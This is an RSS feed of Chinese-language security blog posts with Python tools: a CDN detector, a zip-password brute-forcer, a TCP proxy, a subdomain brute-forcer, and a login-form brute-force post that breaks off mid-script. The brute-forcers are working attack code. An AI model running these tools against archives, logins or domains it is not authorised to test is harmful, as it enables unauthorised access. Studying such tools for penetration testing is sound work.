<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Python实现 on </title>
    <link>http://wyb0.com/tags/python%E5%AE%9E%E7%8E%B0/</link>
    <description>Recent content in Python实现 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Fri, 23 Dec 2016 21:10:05 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/python%E5%AE%9E%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0CDN%E7%9A%84%E5%88%A4%E6%96%AD/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0CDN%E7%9A%84%E5%88%A4%E6%96%AD/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime002.jpg&#34; alt=&#34;银魂&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-什么是cdn:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x00 什么是CDN&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容，
运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的
缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点，
你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-判断方法:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x01 判断方法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;可以查询CNAME记录，每个cdn厂商都有特有的特征串&lt;/li&gt;
&lt;li&gt;查看http返回头的头部信息&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-代码:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x02 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;首先安装dnspython这个第三方模块：pip install dnspython&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import dns.resolver
import urllib2
import urlparse

class CdnCheck(object):
    def __init__(self, url):
        super(CdnCheck, self).__init__()
        self.cdninfo()
        self.url = url
        self.cnames = []
        self.headers = []

    def get_cnames(self): # get all cname
        furl = urlparse.urlparse(self.url)
        url = furl.netloc
        # print url

        rsv = dns.resolver.Resolver()
        # rsv.nameservers = [&#39;114.114.114.114&#39;]
        try:
            answer = dns.resolver.query(url,&#39;CNAME&#39;)
        except Exception as e:
            self.cnames = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)

    def get_cname(self,cname): # get cname
        try:
            answer = dns.resolver.query(cname,&#39;CNAME&#39;)
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)
        except dns.resolver.NoAnswer:
            pass

    def get_headers(self): # get header
        try:
            resp = urllib2.urlopen(self.url)
        except Exception as e:
            self.headers = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            headers = str(resp.headers).lower()
            self.headers = headers

    def matched(self, context, *args): # Matching string 
        if not isinstance(context, basestring):
            context = str(context)

        func = lambda x, y: y in x
        # if any(func(context, pattern) for pattern in args):
        #     return True
        # else:
        #     return False
        for pattern in args:
            if func(context,pattern):
                return pattern
        return False

    def check(self):
        flag = None
        self.get_cnames()
        self.get_headers()
        if self.cnames:
            # print self.cnames
            flag = self.matched(self.cnames,*self.cdn[&#39;cname&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:self.cdn[&#39;cname&#39;].get(flag)}
        if not flag and self.headers:
            flag = self.matched(self.headers,*self.cdn[&#39;headers&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:&#39;unknown&#39;}
        return {&#39;Status&#39;:False, &#39;CNAME&#39;:self.cnames, &#39;Headers&#39;:self.headers}

    def cdninfo(self):
        self.cdn = {
            &#39;headers&#39;: set([
                &#39;via&#39;,
                &#39;x-via&#39;,
                &#39;by-360wzb&#39;,
                &#39;by-anquanbao&#39;,
                &#39;cc_cache&#39;,
                &#39;cdn cache server&#39;,
                &#39;cf-ray&#39;,
                &#39;chinacache&#39;,
                &#39;verycdn&#39;
                &#39;webcache&#39;,
                &#39;x-cacheable&#39;,
                &#39;x-fastly&#39;,
                &#39;yunjiasu&#39;,
            ]),
            &#39;cname&#39;: {
                &#39;tbcache.com&#39;:u&#39;taobao&#39;, # 应该是淘宝自己的。。。。
                &#39;tcdn.qq.com&#39;:u&#39;tcdn.qq.com&#39;, # 应该是腾讯的。。。
                &#39;00cdn.com&#39;:u&#39;XYcdn&#39;, # 星域cdn
                &#39;21cvcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21okglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21speedcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vianet.com.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vokglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;360wzb.com&#39;:u&#39;360&#39;, # 360网站卫士
                &#39;51cdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;acadn.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;aicdn.com&#39;:u&#39;UPYUN&#39;, # 又拍云
                &#39;akadns.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai-staging.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.com&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamaitech.net&#39;:u&#39;Akamai&#39;, # 易通锐进
                &#39;akamaized.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;alicloudlayer.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;alikunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyun-inc.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyuncs.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;amazonaws.com&#39;:u&#39;Amazon Cloudfront&#39;, # 亚马逊
                &#39;anankecdn.com.br&#39;:u&#39;Ananke&#39;, # Ananke
                &#39;aodianyun.com&#39;:u&#39;VOD&#39;, # 奥点云
                &#39;aqb.so&#39;:u&#39;AnQuanBao&#39;, # 安全宝
                &#39;awsdns&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;azioncdn.net&#39;:u&#39;Azion&#39;, # Azion
                &#39;azureedge.net&#39;:u&#39;Azure CDN&#39;, # Microsoft Azure
                &#39;bdydns.com&#39;:u&#39;Baiduyun&#39;, # 百度云
                &#39;bitgravity.com&#39;:u&#39;Tata Communications&#39;, # 待定
                &#39;cachecn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cachefly.net&#39;:u&#39;Cachefly&#39;, # Cachefly
                &#39;ccgslb.com&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;ccgslb.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;cdn-cdn.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn.cloudflare.net&#39;:u&#39;CloudFlare&#39;, # CloudFlare
                &#39;cdn.dnsv1.com&#39;:u&#39;Tengxunyun&#39;, # 腾讯云
                &#39;cdn.ngenix.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn20.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cdn77.net&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdn77.org&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdnetworks.net&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnify.io&#39;:u&#39;CDNify&#39;, # CDNify
                &#39;cdnnetworks.com&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnsun.net&#39;:u&#39;CDNsun&#39;, # CDNsun
                &#39;cdntip.com&#39;:u&#39;QCloud&#39;, # 腾讯云
                &#39;cdnudns.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;cdnvideo.ru&#39;:u&#39;CDNvideo&#39;, # CDNvideo
                &#39;cdnzz.net&#39;:u&#39;SuZhi&#39;, # 速致
                &#39;chinacache.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;chinaidns.net&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;chinanetcenter.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cloudcdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cloudfront.net&#39;:u&#39;Amazon Cloudfront&#39;, # Amazon
                &#39;customcdn.cn&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;customcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;dnion.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;dnspao.com&#39;:u&#39;&#39;, # 待定
                &#39;edgecastcdn.net&#39;:u&#39;EdgeCast&#39;, # EdgeCast
                &#39;edgesuite.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;ewcache.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastcache.com&#39;:u&#39;FastCache&#39;, # 速网科技
                &#39;fastcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastly.net&#39;:u&#39;Fastly&#39;, # Fastly
                &#39;fastweb.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fastwebcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;footprint.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fpbns.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fwcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fwdns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;globalcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;hacdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hadns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hichina.com&#39;:u&#39;WWW&#39;, # 万网
                &#39;hichina.net&#39;:u&#39;WWW&#39;, # 万网
                &#39;hwcdn.net&#39;:u&#39;Highwinds&#39;, # Highwinds
                &#39;incapdns.net&#39;:u&#39;Incapsula&#39;, # Incapsula
                &#39;internapcdn.net&#39;:u&#39;Internap&#39;, # Internap
                &#39;jiashule.com&#39;:u&#39;Jiasule&#39;, # 加速乐
                &#39;kunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunar.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunca.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kxcdn.com&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;lswcdn.net&#39;:u&#39;Leaseweb&#39;, # Leaseweb
                &#39;lxcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;lxdns.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;mwcloudcdn.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;netdna-cdn.com&#39;:u&#39;MaxCDN&#39;, # MaxCDN
                &#39;okcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;okglb.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;ourwebcdn.net&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;ourwebpic.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;presscdn.com&#39;:u&#39;Presscdn&#39;, # Presscdn
                &#39;qingcdn.com&#39;:u&#39;&#39;, # 待定
                &#39;qiniudns.com&#39;:u&#39;QiNiu&#39;, # 七牛云
                &#39;skyparkcdn.net&#39;:u&#39;&#39;, # 待定
                &#39;speedcdns.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;sprycdn.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;tlgslb.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;txcdn.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;txnetworks.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;ucloud.cn&#39;:u&#39;UCloud&#39;, # UCloud
                &#39;unicache.com&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;verygslb.com&#39;:u&#39;VeryCloud&#39;, # 云端网络
                &#39;vo.llnwd.net&#39;:u&#39;Limelight&#39;, # Limelight
                &#39;wscdns.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;wscloudcdn.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;xgslb.net&#39;:u&#39;Webluker&#39;, # WebLuker
                &#39;ytcdn.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;yunjiasu-cdn&#39;:u&#39;Baiduyun&#39;, # 百度云加速
            }
        }


if __name__ == &#39;__main__&#39;:
    # url = &amp;quot;http://www.reber-9.com&amp;quot;
    url = sys.argv[1]
    cdn = CdnCheck(url)
    print cdn.check()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-结果:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x03 结果&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;结果如下：
C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://www.reber-9.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;Baiduyun&#39;}

C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://v.ifeng.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;ChinaCache&#39;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</guid>
      <description>

&lt;h3 id=&#34;0x00-代码:b937e6266634cef75fcb51fa109b76e7&#34;&gt;0x00 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;多线程爆破加密的zip压缩包&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import optparse
import zipfile
import threading
import Queue

queue = Queue.Queue()
lock = threading.Lock()
result = &#39;&#39;

def load_pwd(filename):
    for line in open(filename,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def bruter(zipname,queue):
    global result
    zFile = zipfile.ZipFile(zipname)
    while not queue.empty():
        password = queue.get()
        try:
            zFile.extractall(pwd=password) # 解压
            lock.acquire()
            print &amp;quot;[Ok] password is: %s&amp;quot; % password
            lock.release()
            result = password
        except:
            lock.acquire()
            print &amp;quot;[Error] password not is: %s&amp;quot; % password
            lock.release()
        queue.task_done()

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;zipfile&#39;,
        type=&#39;string&#39;, help=&#39;Target zip file.&#39;)
    parser.add_option(&#39;-p&#39;, &#39;--pfile&#39;, dest=&#39;pwdfile&#39;,default=&#39;pass.txt&#39;,
        type=&#39;string&#39;, help=&#39;Password file.&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--thread_num&#39;, dest=&#39;thread_num&#39;,default=60,
        type=&#39;int&#39;, help=&#39;Thread number.&#39;)

    (options, args) = parser.parse_args()

    if options.zipfile and options.pwdfile:
        load_pwd(options.pwdfile)
    else:
        parser.print_help()
        sys.exit(0)

    threads = []
    for x in range(options.thread_num):
        t = threading.Thread(target=bruter,args=(options.zipfile,queue,))
        t.setDaemon(True)
        t.start()
    queue.join()
    print &amp;quot;result is: %s&amp;quot; % result

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现代理</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86/</link>
      <pubDate>Tue, 13 Sep 2016 11:36:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86/</guid>
      <description>

&lt;h2 id=&#34;帮助信息:1c8d1e1a6033af5d70b3fcb50e371dd2&#34;&gt;帮助信息&lt;/h2&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_proxy_help.png&#34; alt=&#34;帮助信息&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h2 id=&#34;代码如下:1c8d1e1a6033af5d70b3fcb50e371dd2&#34;&gt;代码如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

&#39;This is a proxy&#39;

__author__ = &#39;xxx&#39;

import sys
import socket
import threading
import optparse

lock = threading.Lock()

def locker(msg):
    lock.acquire()
    print msg
    lock.release()

def hexdump (src,length=16):#十六进制导出函数
    result = []
    digits = 4 if isinstance(src,unicode) else 2

    for i in xrange(0,len(src),length):
        s = src[i:i+length]
        hexa = b&#39; &#39;.join(&amp;quot;[%0*X]&amp;quot; % (digits,ord(x)) for x in s)
        text = b&#39;&#39;.join([x if 0x20 &amp;lt;= ord(x) &amp;lt; 0x7F else b&#39;.&#39; for x in s])
        result.append(b&amp;quot;%04X  %-*s  %s&amp;quot; % (i,length*(digits+1),hexa,text))

    print b&#39;\n&#39;.join(result)

def receive_from (connection):
    
    buffer = &amp;quot;&amp;quot;
    
    #我们设置了1秒的超时，这取决于目标的情况，可能需要调整
    connection.settimeout(1)
    try:
        #持续从缓存中读取数据直到没有数据或者超时
        while True:
            data = connection.recv(4096)
            if not data:
                break

            buffer += data
    except:
        pass
        
    return buffer
    
#对目标是远程主机的请求进行修改
def request_handler (buffer):
    #执行包修改
    return buffer

#对目标是本地主机的响应进行修改
def response_handler (buffer):
    #执行包修改
    return buffer

def proxy_handler (client_socket,remote_host,remote_port,receive_first):
    #连接远程主机
    remote_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    remote_socket.connect((remote_host,remote_port))

    #如果必要从远程主机接收数据
    if receive_first:
        remote_buffer = receive_from(remote_socket)
        if len(remote_buffer):
            print &amp;quot;\n[==&amp;gt;] Received %d bytes from remote.&amp;quot; % len(remote_buffer)
            # hexdump(remote_buffer)
        
        #发送给我们的相应处理
        remote_buffer = response_handler(remote_buffer)
        #若我们有数据传递给本地客户端，发送它
        if len(remote_buffer):
            print &amp;quot;[&amp;lt;==] Sending %d bytes to localhost.\n&amp;quot; % len(remote_buffer)
            client_socket.send(remote_buffer)
    
    #现在我们从本地循环读取数据，发送给远程主机和本地主机
    while True:
        #从本地读取数据
        local_buffer = receive_from(client_socket)
        if len(local_buffer):
            print &amp;quot;\n[==&amp;gt;] Received %d bytes from localhost.&amp;quot; % len(local_buffer)
            # hexdump(local_buffer)
            #发送给我们的本地请求
            local_buffer = request_handler(local_buffer)
            #发送给远程主机
            remote_socket.send(local_buffer)
            print &amp;quot;[==&amp;gt;] Sent to remote.&amp;quot;

        #接收响应的数据
        remote_buffer = receive_from(remote_socket)
        if len(remote_buffer):
            print &amp;quot;\n[&amp;lt;==] Received %d bytes from remote.&amp;quot; % len(remote_buffer)
            # hexdump(remote_buffer)
            #发送数据到响应处理函数
            remote_buffer = response_handler(remote_buffer)
            #将响应发送给本地socket
            client_socket.send(remote_buffer)
            print &amp;quot;[==&amp;gt;] Sent to localhost.&amp;quot;

        #若两边都没有数据，关闭连接
        if not len(local_buffer) or not len(remote_buffer):
            client_socket.close()
            remote_socket.close()
            print &amp;quot;[*] No more data. Closing connections.&amp;quot;
            break

def server_loop(local_host,local_port,remote_host,remote_port,receive_first):

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        server.bind((local_host,local_port))
    except:
        print &amp;quot;[!!] Failed to listen on %s:%d&amp;quot; % (local_host,local_port)
        print &amp;quot;[!!] Check for other listening sockets or correct permisssions.&amp;quot;
        sys.exit(0)
    print &amp;quot;[*] Listening on %s:%d......&amp;quot; % (local_host,local_port)
    server.listen(5)

    while True:
        client_socket,addr = server.accept()
        
        #打印本地连接信息
        print &amp;quot;\n[==&amp;gt;] Received incoming connection from %s:%d&amp;quot; % (addr[0],addr[1])

        #开启一个线程与远程主机通信
        proxy_thread = threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))
        proxy_thread.start()

def main ():
    parser = optparse.OptionParser()
    parser.add_option(&#39;--lh&#39;, &#39;--localhost&#39;, dest=&#39;localhost&#39;,default=&#39;127.0.0.1&#39;,
        type=&#39;string&#39;, help=&#39;Localhost.&#39;)
    parser.add_option(&#39;--lp&#39;, &#39;--localport&#39;, dest=&#39;localport&#39;,default=8888,
        type=&#39;int&#39;, help=&#39;Localport.&#39;)
    parser.add_option(&#39;--rh&#39;, &#39;--remotehost&#39;, dest=&#39;remotehost&#39;, default=&#39;127.0.0.1&#39;,
        type=&#39;string&#39;, help=&#39;Remotehost.&#39;)
    parser.add_option(&#39;--rp&#39;, &#39;--remoteport&#39;, dest=&#39;remoteport&#39;, default=8080, 
        type=&#39;int&#39;, help=&#39;Remoteport.&#39;)
    parser.add_option(&#39;--rf&#39;, &#39;--receivefirst&#39;, dest=&#39;receive_first&#39;, default=False,
        action=&#39;store_true&#39;,help=&#39;Connection before send and receive data.&#39;)

    (options, args) = parser.parse_args()

    #设置本地监听参数
    if options.localhost:
        local_host = options.localhost
    if options.localport:
        local_port = options.localport
    
    #设置远程目标
    if options.remotehost:
        remote_host = options.remotehost
    if options.remoteport:
        remote_port = options.remoteport

    receive_first = options.receive_first

    # print local_host,local_port,remote_host,remote_port,receive_first

    #现在设置好我们的监听socket
    server_loop(local_host,local_port,remote_host,remote_port,receive_first)

main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;效果图:1c8d1e1a6033af5d70b3fcb50e371dd2&#34;&gt;效果图&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_proxy_result.png&#34; alt=&#34;效果图&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python爆破二级域名</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</link>
      <pubDate>Mon, 12 Sep 2016 21:31:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</guid>
      <description>

&lt;p&gt;参考：&lt;a href=&#34;https://github.com/lijiejie/subDomainsBrute&#34;&gt;https://github.com/lijiejie/subDomainsBrute&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;帮助信息:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;帮助信息&lt;/h2&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sub_domain_blast_help.png&#34; alt=&#34;帮助信息&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h2 id=&#34;代码:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;代码&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import dns.resolver
import threading
import Queue
import optparse
import sys

queue = Queue.Queue()
lock = threading.Lock()

class GetSubDomain(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for SubDomain&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, target,queue,outfile):
        threading.Thread.__init__(self)
        self.target = target
        self.queue = queue
        self.rsv = dns.resolver.Resolver()
        outfile = target + &#39;.txt&#39; if not outfile else outfile
        self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;)
        self.ip_list = []

    def _scan(self):
        while not self.queue.empty():
            self.ip_list = []
            ips = None
            sub_domain = self.queue.get() + &#39;.&#39; + self.target
            for _ in range(3):
                try:
                    answers = self.rsv.query(sub_domain)
                    if answers:
                        for answer in answers:
                            if answer.address not in self.ip_list:
                                self.ip_list.append(answer.address)
                except dns.resolver.NoNameservers, e:
                    break
                except Exception, e:
                    pass
            if len(self.ip_list)&amp;gt;0:
                ips = &#39;,&#39;.join(self.ip_list)
                msg = sub_domain.ljust(30) + ips + &#39;\n&#39;
                lock.acquire()
                print msg
                self.f.write(msg)
                lock.release()
            self.queue.task_done()

    def run(self):
        self._scan()

def get_target(domain_list):
    targets = []
    for line in open(domain_list,&#39;r&#39;):
        if line:
            targets.append(line.strip())
    return targets

def get_sub_queue(sub_file): #得到所有子域名的queue
    for line in open(sub_file,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
        type=&#39;string&#39;, help=&#39;Get a single top-level domain names.&#39;)
    parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;domain_list&#39;,
        type=&#39;string&#39;, help=&#39;Top-level domain name list.&#39;)
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;sub_file&#39;, default=&#39;sub.txt&#39;,
        type=&#39;string&#39;, help=&#39;Dict file used to brute sub names&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--threads&#39;, dest=&#39;threads_num&#39;, default=60, 
        type=&#39;int&#39;, help=&#39;Number of threads. default = 60&#39;)
    parser.add_option(&#39;-o&#39;, &#39;--outfile&#39;, dest=&#39;outfile&#39;, default=None,
        type=&#39;string&#39;, help=&#39;Output file name. default is {target}.txt&#39;)

    (options, args) = parser.parse_args()
    if options.url:
        urls = [options.url]
    elif options.domain_list:
        urls = get_target(options.domain_list)
    else:
        parser.print_help()
        print &amp;quot;Example: &amp;quot;
        print &amp;quot;\tpython getsub.py -u baidu.com&amp;quot;
        print &amp;quot;\tpython getsub.py -l domain.txt -f sub.txt -t 50&amp;quot;
        sys.exit(0)

    for url in urls:
        get_sub_queue(options.sub_file)
        for x in xrange(1,options.threads_num+1):
            t = GetSubDomain(url,queue,options.outfile)
            t.setDaemon(True)
            t.start()
        queue.join()

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现表单爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</link>
      <pubDate>Mon, 05 Sep 2016 23:43:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;接收变量的php脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;接收变量的php脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//代码仅供测试
&amp;lt;?php
    $name = @$_POST[&#39;uname&#39;];
    $pass = @$_POST[&#39;upass&#39;];

    if (empty($name) or empty($pass)){
        header(&amp;quot;location:http://127.0.0.1:921/test/test/index.html&amp;quot;);
        exit();
    } else {
        if ($name === &#39;admin&#39; and $pass === &#39;123456&#39;){
            header(&amp;quot;location:http://127.0.0.1:921/test/test/sucess.html&amp;quot;);
        } else {
            header(&amp;quot;location:http://127.0.0.1:921/test/test/error.html&amp;quot;);
            exit();
        }
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;爆破表单的python脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;爆破表单的python脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import hashlib
import requests
from Queue import Queue
import threading
from optparse import OptionParser
from time import sleep

lock = threading.Lock()
queue = Queue()
result = []

class FormBlast(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for FormBlast&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *arg):
        super(FormBlast, self).__init__()
        (options,args,queue) = arg
